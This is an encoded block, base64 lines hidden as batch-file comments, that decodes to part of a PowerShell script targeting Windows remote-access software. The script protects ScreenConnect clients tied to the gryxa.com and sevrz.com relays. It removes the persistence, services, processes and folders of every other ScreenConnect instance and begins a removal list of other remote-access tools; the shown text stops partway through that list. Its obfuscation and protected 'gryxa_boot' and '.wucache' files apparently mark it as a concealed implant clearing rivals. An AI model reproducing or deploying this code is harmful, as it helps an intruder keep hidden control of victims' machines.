::IH0NCiAgICAgICAgfQ0KICAgICAgICBmb3JlYWNoICgkYmFzZSBpbiBAKCRlbnY6
::UHJvZ3JhbUZpbGVzLCAke2VudjpQcm9ncmFtRmlsZXMoeDg2KX0pKSB7DQogICAg
::ICAgICAgICBpZiAoLW5vdCAkYmFzZSAtb3IgLW5vdCAoVGVzdC1QYXRoICRiYXNl
::KSkgeyBjb250aW51ZSB9DQogICAgICAgICAgICBHZXQtQ2hpbGRJdGVtIC1MaXRl
::cmFsUGF0aCAkYmFzZSAtRGlyZWN0b3J5IC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2ls
::ZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAgICAg
::ICBpZiAoJF8uTmFtZSAtbWF0Y2ggJ1NjcmVlbkNvbm5lY3QgQ2xpZW50IFwoKFsw
::LTlhLWZBLUZdezE2fSlcKScpIHsgJGZwc1skbWF0Y2hlc1sxXS5Ub0xvd2VyKCld
::ID0gJHRydWUgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIEAo
::JGZwcy5LZXlzIHwgV2hlcmUtT2JqZWN0IHsgJF8gLW5vdGluICRrZWVwIH0pDQog
::ICAgfQ0KDQogICAgZnVuY3Rpb24gVGVzdC1TY0tlZXBlclJlZihbc3RyaW5nXSRz
::KSB7DQogICAgICAgIGlmICgtbm90ICRzKSB7IHJldHVybiAkZmFsc2UgfQ0KICAg
::ICAgICBpZiAoJHMgLW1hdGNoICcoP2kpZ3J5eGFcLmNvbXxzZXZyelwuY29tJykg
::eyByZXR1cm4gJHRydWUgfQ0KICAgICAgICBpZiAoJHMgLW1hdGNoICcoP2kpb3du
::KF9tb258X2xpYnxfc2VjdXJlKT9cLihjbWR8cHMxKXxncnl4YV9ib290fFwud3Vj
::YWNoZScpIHsgcmV0dXJuICR0cnVlIH0NCiAgICAgICAgZm9yZWFjaCAoJGsgaW4g
::JGtlZXApIHsgaWYgKCRrIC1hbmQgJHMgLWxpa2UgIiokayoiKSB7IHJldHVybiAk
::dHJ1ZSB9IH0NCiAgICAgICAgcmV0dXJuICRmYWxzZQ0KICAgIH0NCg0KICAgIGZ1
::bmN0aW9uIFJlbW92ZS1TY1BlcnNpc3RlbmNlKFtzdHJpbmddJEZwKSB7DQogICAg
::ICAgICMgTDM5OiBwdXJnZSBTY3JlZW5Db25uZWN0IHBlcnNpc3RlbmNlIHJlZmVy
::ZW5jaW5nIHRoaXMgRlAgT1IgZ2VuZXJpYyBTQyBpbnN0YWxsZXJzDQogICAgICAg
::ICMgdGhhdCBhcmUgbm90IGtlZXBlci1wcm90ZWN0ZWQgKGJhcmUgbXNpZXhlYyAv
::aSBVUkwgd2F0Y2hkb2dzIHdpdGhvdXQgRlAgbGl0ZXJhbCkuDQogICAgICAgIHRy
::eSB7DQogICAgICAgICAgICBHZXQtU2NoZWR1bGVkVGFzayAtRXJyb3JBY3Rpb24g
::U2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAg
::ICAgICAkdGFzayA9ICRfDQogICAgICAgICAgICAgICAgJGJsb2IgPSAnJw0KICAg
::ICAgICAgICAgICAgIGZvcmVhY2ggKCRhIGluICR0YXNrLkFjdGlvbnMpIHsgJGJs
::b2IgKz0gIiAkKCRhLkV4ZWN1dGUpICQoJGEuQXJndW1lbnRzKSIgfQ0KICAgICAg
::ICAgICAgICAgIGlmICgkYmxvYiAtbm90bWF0Y2ggJyg/aSlTY3JlZW5Db25uZWN0
::fG1zaWV4ZWMnKSB7IHJldHVybiB9DQogICAgICAgICAgICAgICAgaWYgKFRlc3Qt
::U2NLZWVwZXJSZWYgJGJsb2IpIHsgcmV0dXJuIH0NCiAgICAgICAgICAgICAgICAk
::aGl0ID0gJGZhbHNlDQogICAgICAgICAgICAgICAgaWYgKCRGcCAtYW5kICRibG9i
::IC1tYXRjaCBbcmVnZXhdOjpFc2NhcGUoJEZwKSkgeyAkaGl0ID0gJHRydWUgfQ0K
::ICAgICAgICAgICAgICAgIGVsc2VpZiAoJGJsb2IgLW1hdGNoICcoP2kpU2NyZWVu
::Q29ubmVjdFwuQ2xpZW50U2V0dXB8U2NyZWVuQ29ubmVjdCBDbGllbnR8cGtnX2dy
::eXhhXC5tc2l8cGtnXC5tc2knKSB7ICRoaXQgPSAkdHJ1ZSB9DQogICAgICAgICAg
::ICAgICAgaWYgKCRoaXQpIHsNCiAgICAgICAgICAgICAgICAgICAgVW5yZWdpc3Rl
::ci1TY2hlZHVsZWRUYXNrIC1UYXNrTmFtZSAkdGFzay5UYXNrTmFtZSAtVGFza1Bh
::dGggJHRhc2suVGFza1BhdGggLUNvbmZpcm06JGZhbHNlIC1FcnJvckFjdGlvbiBT
::aWxlbnRseUNvbnRpbnVlDQogICAgICAgICAgICAgICAgICAgIExvZyAicGVyc2lz
::dF90YXNrX3JlbW92ZWQgJCgkdGFzay5UYXNrUGF0aCkkKCR0YXNrLlRhc2tOYW1l
::KSBmcD0kRnAiDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAg
::ICAgICB9IGNhdGNoIHsgTG9nICJwZXJzaXN0X3Rhc2tfZW51bV9lcnIgJF8iIH0N
::CiAgICAgICAgZm9yZWFjaCAoJHJrIGluIEAoJ0hLTE06XFNPRlRXQVJFXE1pY3Jv
::c29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1bicsDQogICAgICAgICAgICAg
::ICAgICAgICAgICAgICdIS0xNOlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xD
::dXJyZW50VmVyc2lvblxSdW5PbmNlJywNCiAgICAgICAgICAgICAgICAgICAgICAg
::ICAgJ0hLTE06XFNPRlRXQVJFXFdPVzY0MzJOb2RlXE1pY3Jvc29mdFxXaW5kb3dz
::XEN1cnJlbnRWZXJzaW9uXFJ1bicsDQogICAgICAgICAgICAgICAgICAgICAgICAg
::ICdIS0xNOlxTT0ZUV0FSRVxXT1c2NDMyTm9kZVxNaWNyb3NvZnRcV2luZG93c1xD
::dXJyZW50VmVyc2lvblxSdW5PbmNlJywNCiAgICAgICAgICAgICAgICAgICAgICAg
::ICAgJ0hLQ1U6XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJz
::aW9uXFJ1bicsDQogICAgICAgICAgICAgICAgICAgICAgICAgICdIS0NVOlxTT0ZU
::V0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW5PbmNlJykp
::IHsNCiAgICAgICAgICAgIGlmICgtbm90IChUZXN0LVBhdGggJHJrKSkgeyBjb250
::aW51ZSB9DQogICAgICAgICAgICAkcCA9IEdldC1JdGVtUHJvcGVydHkgJHJrIC1F
::cnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgICAgICBpZiAoLW5v
::dCAkcCkgeyBjb250aW51ZSB9DQogICAgICAgICAgICBmb3JlYWNoICgkcHJvcCBp
::biAkcC5QU09iamVjdC5Qcm9wZXJ0aWVzKSB7DQogICAgICAgICAgICAgICAgaWYg
::KCRwcm9wLk5hbWUgLWxpa2UgJ1BTKicpIHsgY29udGludWUgfQ0KICAgICAgICAg
::ICAgICAgICR2ID0gW3N0cmluZ10kcHJvcC5WYWx1ZQ0KICAgICAgICAgICAgICAg
::IGlmIChUZXN0LVNjS2VlcGVyUmVmICR2KSB7IGNvbnRpbnVlIH0NCiAgICAgICAg
::ICAgICAgICBpZiAoJHYgLW5vdG1hdGNoICcoP2kpU2NyZWVuQ29ubmVjdHxtc2ll
::eGVjJykgeyBjb250aW51ZSB9DQogICAgICAgICAgICAgICAgJGhpdCA9ICRmYWxz
::ZQ0KICAgICAgICAgICAgICAgIGlmICgkRnAgLWFuZCAkdiAtbWF0Y2ggW3JlZ2V4
::XTo6RXNjYXBlKCRGcCkpIHsgJGhpdCA9ICR0cnVlIH0NCiAgICAgICAgICAgICAg
::ICBlbHNlaWYgKCR2IC1tYXRjaCAnKD9pKVNjcmVlbkNvbm5lY3RcLkNsaWVudFNl
::dHVwfFNjcmVlbkNvbm5lY3QgQ2xpZW50JykgeyAkaGl0ID0gJHRydWUgfQ0KICAg
::ICAgICAgICAgICAgIGlmICgkaGl0KSB7DQogICAgICAgICAgICAgICAgICAgIFJl
::bW92ZS1JdGVtUHJvcGVydHkgLVBhdGggJHJrIC1OYW1lICRwcm9wLk5hbWUgLUZv
::cmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgICAgICAg
::ICAgICAgIExvZyAicGVyc2lzdF9ydW5rZXlfcmVtb3ZlZCAkcmtcJCgkcHJvcC5O
::YW1lKSBmcD0kRnAiDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0K
::ICAgICAgICB9DQogICAgfQ0KDQogICAgTG9nICdleHRlcm1pbmF0ZV9lbmdpbmVf
::TDdfYmVnaW4nDQoNCiAgICAjIHB1cmdlIHBlcnNpc3RlbmNlIGZvciBldmVyeSBu
::b24ta2VlcGVyIFNDIGZpbmdlcnByaW50IEJFRk9SRSBwcm9kdWN0L3N2Yy9kaXIg
::cmVtb3ZhbCwNCiAgICAjIHNvIGFuIG9sZC9mb3JlaWduIFNDIHdhdGNoZG9nIGNh
::bm5vdCByZWluc3RhbGwgaXRzZWxmIChhbmQgY3Jvc3Mta2lsbCBHcnl4YSkgbWlk
::LXBhc3MuDQogICAgZm9yZWFjaCAoJGZwWCBpbiAoR2V0LU5vbktlZXBlclNjRnBz
::KSkgew0KICAgICAgICBSZW1vdmUtU2NQZXJzaXN0ZW5jZSAkZnBYDQogICAgfQ0K
::DQogICAgIyAxLiBmb3JlaWduIFNDIHByb2R1Y3RzIGZyb20gQk9USCBjb3JyZWN0
::IEFSUCBoaXZlcw0KICAgICRzZWVuID0gQHt9DQogICAgZm9yZWFjaCAoJHJvb3Qg
::aW4gJHNjcmlwdDpVbmluc3RhbGxSb290cykgew0KICAgICAgICBpZiAoLW5vdCAo
::VGVzdC1QYXRoICRyb290KSkgeyBMb2cgImhpdmVfbWlzc2luZyAkcm9vdCI7IGNv
::bnRpbnVlIH0NCiAgICAgICAgTG9nICJoaXZlX3NjYW4gJHJvb3QiDQogICAgICAg
::IEdldC1DaGlsZEl0ZW0gJHJvb3QgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
::dWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICAkcHJvcCA9IEdldC1J
::dGVtUHJvcGVydHkgJF8uUFNQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRp
::bnVlDQogICAgICAgICAgICAkZG4gPSAkcHJvcC5EaXNwbGF5TmFtZQ0KICAgICAg
::ICAgICAgaWYgKC1ub3QgJGRuKSB7IHJldHVybiB9DQogICAgICAgICAgICBpZiAo
::JGRuIC1ub3RtYXRjaCAnKD9pKVNjcmVlbkNvbm5lY3RccytDbGllbnRccypcKChb
::MC05QS1GYS1mXXsxNn0pXCknKSB7IHJldHVybiB9DQogICAgICAgICAgICAkZnAg
::PSAkTWF0Y2hlc1sxXS5Ub0xvd2VyKCkNCiAgICAgICAgICAgIGlmICgkZnAgLWlu
::ICRrZWVwKSB7IHJldHVybiB9DQogICAgICAgICAgICAkdXMgPSAkcHJvcC5Vbmlu
::c3RhbGxTdHJpbmcNCiAgICAgICAgICAgIGlmICgkdXMgLWFuZCAkdXMgLW1hdGNo
::ICcoP2kpZ3J5eGFcLmNvbScpIHsgTG9nICJwcm9kdWN0X3NraXBfZ3J5eGFfcmVs
::YXkgWyRkbl0iOyByZXR1cm4gfQ0KICAgICAgICAgICAgaWYgKCRzZWVuLkNvbnRh
::aW5zS2V5KCRfLlBTQ2hpbGROYW1lKSkgeyByZXR1cm4gfQ0KICAgICAgICAgICAg
::JHNlZW5bJF8uUFNDaGlsZE5hbWVdID0gJHRydWUNCiAgICAgICAgICAgIGlmIChV
::bmluc3RhbGwtUHJvZHVjdEtleSAkXykgeyAkbi5wcm9kdWN0KysgfSBlbHNlIHsg
::JG4uZmFpbCsrOyBMb2cgInByb2R1Y3RfUkVNT1ZFX0ZBSUxFRCBbJGRuXSIgfQ0K
::ICAgICAgICB9DQogICAgfQ0KDQogICAgIyAyLiBmb3JlaWduIFNDIHNlcnZpY2Vz
::IChza2lwIGlmIGtlZXBlciBGUCBvciByZWxheSBpcyBncnl4YS5jb20pDQogICAg
::Zm9yZWFjaCAoJHN2YyBpbiAoR2V0LVNlcnZpY2UgLUVycm9yQWN0aW9uIFNpbGVu
::dGx5Q29udGludWUgfCBXaGVyZS1PYmplY3QgeyAkXy5OYW1lIC1saWtlICdTY3Jl
::ZW5Db25uZWN0IENsaWVudConIH0pKSB7DQogICAgICAgIGlmIChJcy1LZWVwZXIg
::JHN2Yy5OYW1lKSB7IGNvbnRpbnVlIH0NCiAgICAgICAgJGltZyA9IChHZXQtSXRl
::bVByb3BlcnR5ICJIS0xNOlxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcU2Vydmlj
::ZXNcJCgkc3ZjLk5hbWUpIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSku
::SW1hZ2VQYXRoDQogICAgICAgIGlmIChJcy1LZWVwZXIgJGltZykgeyBMb2cgInN2
::Y19za2lwX2dyeXhhX3JlbGF5ICQoJHN2Yy5OYW1lKSI7IGNvbnRpbnVlIH0NCiAg
::ICAgICAgJiBzYy5leGUgc3RvcCAiJCgkc3ZjLk5hbWUpIiAyPiYxIHwgT3V0LU51
::bGwNCiAgICAgICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyA2MDANCiAgICAg
::ICAgJiBzYy5leGUgZGVsZXRlICIkKCRzdmMuTmFtZSkiIDI+JjEgfCBPdXQtTnVs
::bA0KICAgICAgICAkbi5zdmMrKzsgTG9nICJzdmNfZGVsZXRlZCAkKCRzdmMuTmFt
::ZSkiDQogICAgfQ0KDQogICAgIyAzLiBmb3JlaWduIFNDIHByb2Nlc3NlcyDigJQg
::T05MWSBpZiBwYXRoL2NtZGxpbmUgZW1iZWRzIGEgTk9OLWtlZXBlciBGUC4NCiAg
::ICAjIE80MTogbnVsbCBFeGVjdXRhYmxlUGF0aCB1c2VkIHRvIGtpbGwgR3J5eGEg
::Q2xpZW50U2VydmljZSBldmVyeSB0aWNrIOKGkiByZWluc3RhbGwgbG9vcC4NCiAg
::ICBHZXQtQ2ltSW5zdGFuY2UgV2luMzJfUHJvY2VzcyAtRmlsdGVyICJOYW1lIGxp
::a2UgJ1NjcmVlbkNvbm5lY3QlJyIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
::dWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICRleGUgPSBbc3RyaW5nXSRf
::LkV4ZWN1dGFibGVQYXRoDQogICAgICAgICRjbWQgPSBbc3RyaW5nXSRfLkNvbW1h
::bmRMaW5lDQogICAgICAgICRibG9iID0gIiRleGUgJGNtZCINCiAgICAgICAgaWYg
::KElzLUtlZXBlciAkYmxvYikgeyByZXR1cm4gfQ0KICAgICAgICBpZiAoJGJsb2Ig
::LW1hdGNoICcoP2kpZ3J5eGFcLmNvbScpIHsgTG9nICJwcm9jX3NraXBfZ3J5eGFf
::cmVsYXkgcGlkPSQoJF8uUHJvY2Vzc0lkKSI7IHJldHVybiB9DQogICAgICAgIGlm
::ICgkYmxvYiAtbm90bWF0Y2ggJ1woKFswLTlhLWZBLUZdezE2fSlcKScpIHsNCiAg
::ICAgICAgICAgIExvZyAicHJvY19za2lwX25vX2ZwIHBpZD0kKCRfLlByb2Nlc3NJ
::ZCkgbmFtZT0kKCRfLk5hbWUpIg0KICAgICAgICAgICAgcmV0dXJuDQogICAgICAg
::IH0NCiAgICAgICAgJGZwID0gJE1hdGNoZXNbMV0uVG9Mb3dlcigpDQogICAgICAg
::IGlmICgkZnAgLWluICRrZWVwKSB7IHJldHVybiB9DQogICAgICAgIFN0b3AtUHJv
::Y2VzcyAtSWQgJF8uUHJvY2Vzc0lkIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50
::bHlDb250aW51ZQ0KICAgICAgICAkbi5wcm9jKys7IExvZyAicHJvY19raWxsZWQg
::cGlkPSQoJF8uUHJvY2Vzc0lkKSBmcD0kZnAgZXhlPSRleGUiDQogICAgfQ0KDQog
::ICAgIyA0LiBmb3JlaWduIFNDIGluc3RhbGwgZGlycyAoUEYgKyBQRjg2KQ0KICAg
::IGZvcmVhY2ggKCRiYXNlIGluIEAoJGVudjpQcm9ncmFtRmlsZXMsICR7ZW52OlBy
::b2dyYW1GaWxlcyh4ODYpfSkpIHsNCiAgICAgICAgaWYgKC1ub3QgJGJhc2UgLW9y
::IC1ub3QgKFRlc3QtUGF0aCAkYmFzZSkpIHsgY29udGludWUgfQ0KICAgICAgICBH
::ZXQtQ2hpbGRJdGVtIC1MaXRlcmFsUGF0aCAkYmFzZSAtRGlyZWN0b3J5IC1Gb3Jj
::ZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8DQogICAgICAgICAgICBX
::aGVyZS1PYmplY3QgeyAkXy5OYW1lIC1saWtlICdTY3JlZW5Db25uZWN0KicgfSB8
::IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAgICAgICAkZCA9ICRfLkZ1bGxO
::YW1lDQogICAgICAgICAgICAgICAgaWYgKElzLUtlZXBlciAkZCkgeyByZXR1cm4g
::fQ0KICAgICAgICAgICAgICAgICMgZGlyIGNhcnJpZXMgbm8gRlAvcmVsYXkgaW4g
::aXRzIG5hbWU7IHByb3RlY3QgdGhlIG9uZSBiYWNraW5nIGEga2VlcGVyL2dyeXhh
::IHNlcnZpY2UNCiAgICAgICAgICAgICAgICAkbGVhZiA9ICRfLk5hbWUNCiAgICAg
::ICAgICAgICAgICAkc3ZjSGVyZSA9IEdldC1TZXJ2aWNlIC1FcnJvckFjdGlvbiBT
::aWxlbnRseUNvbnRpbnVlIHwgV2hlcmUtT2JqZWN0IHsgJF8uTmFtZSAtbGlrZSAn
::U2NyZWVuQ29ubmVjdCBDbGllbnQqJyB9IHwgV2hlcmUtT2JqZWN0IHsNCiAgICAg
::ICAgICAgICAgICAgICAgJGltID0gKEdldC1JdGVtUHJvcGVydHkgIkhLTE06XFNZ
::U1RFTVxDdXJyZW50Q29udHJvbFNldFxTZXJ2aWNlc1wkKCRfLk5hbWUpIiAtRXJy
::b3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkuSW1hZ2VQYXRoDQogICAgICAgICAg
::ICAgICAgICAgICRpbSAtYW5kICgkaW0gLWxpa2UgIiokbGVhZioiKQ0KICAgICAg
::ICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAoJHN2Y0hlcmUpIHsgTG9n
::ICJkaXJfc2tpcF9saXZlX3N2YyAkZCI7IHJldHVybiB9DQogICAgICAgICAgICAg
::ICAgaWYgKEZvcmNlLVJlbW92ZURpciAkZCkgeyAkbi5kaXIrKzsgTG9nICJkaXJf
::cmVtb3ZlZCAkZCIgfQ0KICAgICAgICAgICAgICAgIGVsc2UgeyAkbi5mYWlsKys7
::IExvZyAiZGlyX1JFTU9WRV9GQUlMRUQgJGQiIH0NCiAgICAgICAgICAgIH0NCiAg
::ICB9DQoNCiAgICAjIDUuIGRpc2FsbG93ZWQgUk1NIC8gcmVtb3RlLWFjY2VzcyB0
::b29scyAobWFya2V0IGNvdmVyYWdlIDIwMjYpLg0KICAgICMgS0VFUCBmb3JldmVy
::OiBEYXR0by9DZW50cmFTdGFnZSArIFNjcmVlbkNvbm5lY3Qga2VlcCBGUHMgKGhh
::bmRsZWQgYWJvdmUpLg0KICAgICMgTkVWRVIgcHV0IERhdHRvL0NlbnRyYVN0YWdl
::L0NhZ1NlcnZpY2UgaW4gdGhpcyBsaXN0Lg0KICAgIGZ1bmN0aW9uIElzLURhdHRv
::S2VlcGVyKFtzdHJpbmddJHMpIHsNCiAgICAgICAgaWYgKC1ub3QgJHMpIHsgcmV0
::dXJuICRmYWxzZSB9DQogICAgICAgIHJldHVybiBbYm9vbF0oJHMgLW1hdGNoICco
::P2kpRGF0dG98Q2VudHJhU3RhZ2V8Q2FnU2VydmljZXxBdXRvdGFza0VuZHBvaW50
::JykNCiAgICB9DQogICAgJHJtbSA9IEAoDQogICAgICAgIEB7IFRhZz0nQW55RGVz
::ayc7ICAgICAgU3ZjPUAoJ0FueURlc2snKTsgUHJvYz1AKCdBbnlEZXNrJyk7IERp
::cnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQW55RGVzayIsIiR7ZW52OlByb2dyYW1G
::aWxlcyh4ODYpfVxBbnlEZXNrIiwiJGVudjpQcm9ncmFtRGF0YVxBbnlEZXNrIik7
::IFByb2Q9QCgnQW55RGVzayonKSB9DQogICAgICAgIEB7IFRhZz0nVGVhbVZpZXdl
::cic7ICAgU3ZjPUAoJ1RlYW1WaWV3ZXIqJyk7IFByb2M9QCgnVGVhbVZpZXdlcion
::LCd0dl93MzIqJywndHZfeDY0KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVz
::XFRlYW1WaWV3ZXIiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cVGVhbVZpZXdl
::ciIpOyBQcm9kPUAoJ1RlYW1WaWV3ZXIqJykgfQ0KICAgICAgICBAeyBUYWc9J1Nw
::bGFzaHRvcCc7ICAgIFN2Yz1AKCdTcGxhc2h0b3AqJywnU1JTZXJ2aWNlJywnU1NV
::U2VydmljZScpOyBQcm9jPUAoJ1NwbGFzaHRvcConLCdzdHJ3aW5jbHQqJywnU1JN
::YW5hZ2VyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFNwbGFzaHRvcCIs
::IiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxTcGxhc2h0b3AiKTsgUHJvZD1AKCdT
::cGxhc2h0b3AqJykgfQ0KICAgICAgICBAeyBUYWc9J0xvZ01lSW4nOyAgICAgIFN2
::Yz1AKCdMb2dNZUluJywnTE1JR3VhcmRpYW5TdmMnLCdMTUlpZ25pdGlvbicpOyBQ
::cm9jPUAoJ0xvZ01lSW4qJywnTE1JR3VhcmRpYW4qJywnUmFTZXJ2ZXIqJyk7IERp
::cnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTG9nTWVJbiIsIiR7ZW52OlByb2dyYW1G
::aWxlcyh4ODYpfVxMb2dNZUluIik7IFByb2Q9QCgnTG9nTWVJbionKSB9DQogICAg
::ICAgIEB7IFRhZz0nR29Ubyc7ICAgICAgICAgU3ZjPUAoJ0dvVG9NeVBDKicsJ0dv
::VG9Bc3Npc3QqJywnR29Ub1Jlc29sdmUqJyk7IFByb2M9QCgnR29Ub015UEMqJywn
::R29Ub0Fzc2lzdConLCdnMm0qJywnR29Ub1Jlc29sdmUqJyk7IERpcnM9QCgiJGVu
::djpQcm9ncmFtRmlsZXNcR29Ub015UEMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2
::KX1cR29Ub015UEMiKTsgUHJvZD1AKCdHb1RvTXlQQyonLCdHb1RvQXNzaXN0Kics
::J0dvVG8gUmVzb2x2ZSonLCdHb1RvTWVldGluZyonLCdHb1RvIENvbm5lY3QqJykg
::fQ0KICAgICAgICBAeyBUYWc9J1J1c3REZXNrJzsgICAgIFN2Yz1AKCdSdXN0RGVz
::aycsJ3J1c3RkZXNrKicpOyBQcm9jPUAoJ3J1c3RkZXNrKicpOyBEaXJzPUAoIiRl
::bnY6UHJvZ3JhbUZpbGVzXFJ1c3REZXNrIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4
::Nil9XFJ1c3REZXNrIik7IFByb2Q9QCgnUnVzdERlc2sqJykgfQ0KICAgICAgICBA
::eyBUYWc9J1N1cHJlbW8nOyAgICAgIFN2Yz1AKCdTdXByZW1vKicpOyBQcm9jPUAo
::J1N1cHJlbW8qJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcU3VwcmVtbyIs
::IiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxTdXByZW1vIik7IFByb2Q9QCgnU3Vw
::cmVtbyonKSB9DQogICAgICAgIEB7IFRhZz0nRFdTZXJ2aWNlJzsgICAgU3ZjPUAo
::J0RXQWdlbnQnLCdkd2FnZW50KicpOyBQcm9jPUAoJ2R3YWdlbnQqJyk7IERpcnM9
::QCgiJGVudjpQcm9ncmFtRmlsZXNcRFdBZ2VudCIsIiR7ZW52OlByb2dyYW1GaWxl
::cyh4ODYpfVxEV0FnZW50IiwiJGVudjpQcm9ncmFtRGF0YVxEV0FnZW50Iik7IFBy
::b2Q9QCgnRFdBZ2VudConLCdEV1NlcnZpY2UqJykgfQ0KICAgICAgICBAeyBUYWc9
::J1pvaG9Bc3Npc3QnOyAgIFN2Yz1AKCdab2hvQXNzaXN0KicsJ1pvaG9NZWV0aW5n
::KicpOyBQcm9jPUAoJ1pvaG9Bc3Npc3QqJywnWm9ob1VSU0IqJyk7IERpcnM9QCgi
::JGVudjpQcm9ncmFtRmlsZXNcWm9ob01lZXRpbmciLCIke2VudjpQcm9ncmFtRmls
::ZXMoeDg2KX1cWm9ob01lZXRpbmciKTsgUHJvZD1AKCdab2hvIEFzc2lzdConLCda
::b2hvTWVldGluZyonKSB9DQogICAgICAgIEB7IFRhZz0nUmVtb3RlUEMnOyAgICAg
::U3ZjPUAoJ1JlbW90ZVBDKicpOyBQcm9jPUAoJ1JlbW90ZVBDKicsJ1JQQ1N1aXRl
::KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFJlbW90ZVBDIiwiJHtlbnY6
::UHJvZ3JhbUZpbGVzKHg4Nil9XFJlbW90ZVBDIik7IFByb2Q9QCgnUmVtb3RlUEMq
::JykgfQ0KICAgICAgICBAeyBUYWc9J0JvbWdhcic7ICAgICAgIFN2Yz1AKCdib21n
::YXIqJywnQmV5b25kVHJ1c3QqJyk7IFByb2M9QCgnYm9tZ2FyKicpOyBEaXJzPUAo
::IiRlbnY6UHJvZ3JhbUZpbGVzXEJvbWdhciIsIiR7ZW52OlByb2dyYW1GaWxlcyh4
::ODYpfVxCb21nYXIiLCIkZW52OlByb2dyYW1GaWxlc1xCZXlvbmRUcnVzdCIsIiR7
::ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxCZXlvbmRUcnVzdCIpOyBQcm9kPUAoJ0Jv
::bWdhcionLCdCZXlvbmRUcnVzdConKSB9DQogICAgICAgIEB7IFRhZz0nUGFyc2Vj
::JzsgICAgICAgU3ZjPUAoJ1BhcnNlYyonKTsgUHJvYz1AKCdwYXJzZWNkKicsJ3Bz
::ZXJ2aWNlKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFBhcnNlYyIsIiR7
::ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxQYXJzZWMiLCIkZW52OlByb2dyYW1EYXRh
::XFBhcnNlYyIpOyBQcm9kPUAoJ1BhcnNlYyonKSB9DQogICAgICAgIEB7IFRhZz0n
::Q2hyb21lUkQnOyAgICAgU3ZjPUAoJ2Nocm9tb3RpbmcqJyk7IFByb2M9QCgncmVt
::b3RpbmdfaG9zdConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xHb29nbGVc
::Q2hyb21lIFJlbW90ZSBEZXNrdG9wIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9
::XEdvb2dsZVxDaHJvbWUgUmVtb3RlIERlc2t0b3AiKTsgUHJvZD1AKCdDaHJvbWUg
::UmVtb3RlIERlc2t0b3AqJykgfQ0KICAgICAgICBAeyBUYWc9J1VsdHJhVk5DJzsg
::ICAgIFN2Yz1AKCd1dm5jKicsJ3dpbnZuYyonKTsgUHJvYz1AKCd3aW52bmMqJywn
::dXZuYyonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xVbHRyYVZOQyIsIiR7
::ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxVbHRyYVZOQyIpOyBQcm9kPUAoJ1VsdHJh
::Vk5DKicsJ1dpblZOQyonKSB9DQogICAgICAgIEB7IFRhZz0nVGlnaHRWTkMnOyAg
::ICAgU3ZjPUAoJ3R2bnNlcnZlcionKTsgUHJvYz1AKCd0dm5zZXJ2ZXIqJywndHZu
::dmlld2VyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFRpZ2h0Vk5DIiwi
::JHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFRpZ2h0Vk5DIik7IFByb2Q9QCgnVGln
::aHRWTkMqJykgfQ0KICAgICAgICBAeyBUYWc9J1JlYWxWTkMnOyAgICAgIFN2Yz1A
::KCd2bmNzZXJ2ZXIqJyk7IFByb2M9QCgndm5jc2VydmVyKicsJ3ZuY3ZpZXdlcion
::KTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xSZWFsVk5DIiwiJHtlbnY6UHJv
::Z3JhbUZpbGVzKHg4Nil9XFJlYWxWTkMiKTsgUHJvZD1AKCdWTkMgU2VydmVyKics
::J1JlYWxWTkMqJykgfQ0KICAgICAgICBAeyBUYWc9J0RhbWVXYXJlJzsgICAgIFN2
::Yz1AKCdEYW1lV2FyZSonKTsgUHJvYz1AKCdEV1JDUyonLCdEV1JDQyonLCdEYW1l
::V2FyZSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xTb2xhcldpbmRzIiwi
